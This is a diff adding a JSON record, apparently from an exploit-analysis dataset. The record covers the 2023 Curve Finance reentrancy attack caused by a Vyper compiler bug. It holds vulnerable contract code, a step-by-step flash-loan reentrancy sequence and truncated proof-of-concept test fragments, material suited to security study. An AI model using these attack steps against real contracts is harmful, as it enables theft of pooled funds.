@@ -1,0 +1,51 @@
+{
+ "id": "2023__2023-07-30_Curve_VyperReentrancy_ETH",
+ "source_file": "2023/2023-07-30_Curve_VyperReentrancy_ETH.md",
+ "title": "Curve Finance — Vyper Compiler Bug Reentrancy Attack Analysis",
+ "date": "2023-07-30",
+ "protocol": "Curve Finance",
+ "chain": "Ethereum",
+ "loss_raw": "~$73,000,000 gross (alETH ~$13.6M–$20.5M, msETH ~$1.6M, pETH ~$11.5M, CRV/ETH ~$22–24M); net loss after white-hat recoveries ~$19–20M (≈73% returned)",
+ "loss_usd": 73000000.0,
+ "root_cause": "Vyper compiler (0.2.15, 0.2.16, 0.3.0) bug causing `@nonreentrant` decorator malfunction",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "reentrancy"
+ ],
+ "code_before": [
+  "# ❌ Vulnerable: this decorator fails to generate correct reentrancy guard bytecode\n@nonreentrant(\"lock\")\n@external\n@payable\ndef add_liquidity(amounts: uint256[N_COINS], min_mint_amount: uint256) -> uint256:\n    # Internal logic ...\n    # ETH refund transfers to msg.sender → triggers attacker's receive()\n    if use_eth:\n        raw_call(msg.sender, b\"\", value=eth_value)  # ❌ Reentrancy possible at this point\n    # LP token minting completes after the call\n    return mint_amount",
+  "// ❌ Compiler bug: lock slot check/set code is missing or misplaced\n// As a result, the lock state always reads as 0 (unlocked), allowing reentrancy\nmodifier nonReentrant_BROKEN() {\n    // ❌ No lock check code, or incorrect slot reference\n    _;\n    // ❌ No lock set code\n}",
+  "# ❌ Vulnerable: @nonreentrant decorator does not actually function\n@nonreentrant(\"lock\")\n@external\n@payable\ndef add_liquidity(amounts: uint256[2], min_mint_amount: uint256) -> uint256:\n    # Liquidity ratio calculation\n    d1: uint256 = self._A_gamma()\n    # ...\n    # Balance updates precede the process of depositing ETH into the pool\n    # ...\n    # ❌ ETH refund can occur before LP token minting\n    # → attacker's receive() executes at this point, enabling reentrancy\n    mint_amount: uint256 = self._calc_token_amount(amounts, True)\n    CurveToken(self.token).mint(msg.sender, mint_amount)  # LP token mint\n    return mint_amount\n\n# ❌ Vulnerable: @nonreentrant decorator does not actually function\n@nonreentrant(\"lock\")\n@external\ndef remove_liquidity(token_amount: uint256, min_amounts: uint256[2]):\n    # msg.sender.call{value}() occurs when returning ETH\n    # → attacker's receive() can reenter with already-minted LP tokens\n    for i in range(N_COINS):\n        if i == 0:\n            raw_call(msg.sender, b\"\", value=amounts[0])  # ❌ ETH transfer → reentrancy trigger\n        # ..."
+ ],
+ "code_after": [
+  "// ✅ Correct reentrancy guard — code that a proper compiler should insert\n// Store lock state in a storage slot\nuint256 constant LOCK_SLOT = keccak256(\"vyper.reentrancy_lock\");\n\nmodifier nonReentrant() {\n    // ✅ On entry: verify lock slot is empty, then set it\n    require(storageLoad(LOCK_SLOT) == 0, \"Reentrancy blocked\");\n    storageStore(LOCK_SLOT, 1);\n    _;\n    // ✅ On exit: release lock\n    storageStore(LOCK_SLOT, 0);\n}",
+  "# ✅ Fixed: correctly functioning @nonreentrant decorator (Vyper 0.3.10+)\n@nonreentrant(\"lock\")  # ✅ Compiler generates correct lock bytecode\n@external\n@payable\ndef add_liquidity(amounts: uint256[2], min_mint_amount: uint256) -> uint256:\n    # ✅ CEI pattern compliant: state changes before ETH transfer\n    # ✅ Lock actually works, so reentrancy immediately reverts\n    # ...\n    mint_amount: uint256 = self._calc_token_amount(amounts, True)\n    CurveToken(self.token).mint(msg.sender, mint_amount)\n    return mint_amount"
+ ],
+ "steps": [
+  "1. **Flash loan acquisition**: Flash loan 80,000 WETH from Balancer Vault",
+  "2. **WETH → ETH conversion**: Call `WETH.withdraw()` to obtain 80,000 ETH",
+  "3. **1st add_liquidity**: Deposit 40,000 ETH into CurvePool to obtain LP tokens",
+  "4. **1st remove_liquidity call (reentrancy entry point)**:",
+  "- CurvePool transfers ETH to attacker → triggers `receive()`",
+  "5. **During reentrancy — 2nd add_liquidity**: Deposit an additional 40,000 ETH inside `receive()` → obtain additional LP tokens (permitted due to lock malfunction)",
+  "6. **1st remove_liquidity completes**: Return from reentrancy and complete remove_liquidity → LP tokens burned, ETH received",
+  "7. **Nonce increment**: Verify double-minted LP token balance",
+  "8. **2nd remove_liquidity**: Drain additional ETH with the surplus double-minted LP tokens (equivalent to 10,272 ETH)",
+  "9. **pETH → ETH swap**: Exchange obtained pETH for ETH",
+  "10. **ETH → WETH conversion**: Convert profit",
+  "11. **Flash loan repayment**: Return 80,000 WETH to Balancer",
+  "12. **Profit realization**: ~$11.5M USD worth of ETH obtained",
+  "20-iteration loop (repeated attack in smaller units):",
+  "1. Flash loan 10,000 WETH from Balancer",
+  "2. WETH → ETH conversion",
+  "3. Loop (20 iterations):",
+  "- `add_liquidity(400 ETH)` → `remove_liquidity` (reentrancy trigger) → execute `add_liquidity` + `exchange` reentrancy",
+  "- `remove_liquidity_one_coin` → receive ETH",
+  "- `exchange(CRV→ETH)` → receive additional ETH"
+ ],
+ "other_code": [
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\n// @KeyInfo - Total Lost : ~41M USD$ (pETH pool alone)\n// Attacker : 0x6ec21d1868743a44318c3c259a6d4953f9978538\n// Attack Tx : 0xa84aa065ce61dbb1eb50ab6ae67fc31a9da50dd2c74eefd561661bfce2f1620c\n\ncontract ContractTest is Test {\n    IWFTM WETH = IWFTM(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));\n    IERC20 pETH = IERC20(0x836A808d4828586A69364065A1e064609F5078c7);\n    IERC20 LP = IERC20(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);\n    ICurve CurvePool = ICurve(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);\n    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);\n    uint256 nonce; // Flag for tracking reentrancy count\n\n    function testExploit() external {\n        deal(address(this), 0);\n",
+  "// Attacker: 0xb752def3a1fded45d6c4b9f4a8f18e645b41b324\n// Attack Tx: 0x2e7dc8b2fb7e25fd00ed9565dcc0ad4546363171d5e00f196d48103983ae477c\n\ncontract ContractTest is Test {\n    ICurve CurvePool = ICurve(0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511); // CRV/ETH pool\n    uint256 nonce; // Track reentrancy stage: reenter every multiple of 3\n\n    function receiveFlashLoan(...) external {\n        WETH.withdraw(WETH.balanceOf(address(this)));\n\n        // Progressive profit maximization via 20-iteration loop\n        for (uint256 i; i < 20; ++i) {\n            uint256[2] memory amount;\n            amount[0] = 400 ether;\n            amount[1] = 0;\n\n            // add_liquidity → remove_liquidity (reentrancy trigger)\n            CurvePool.add_liquidity{value: 400 ether}(amount, 0, true);\n            amoun"
+ ]
+}
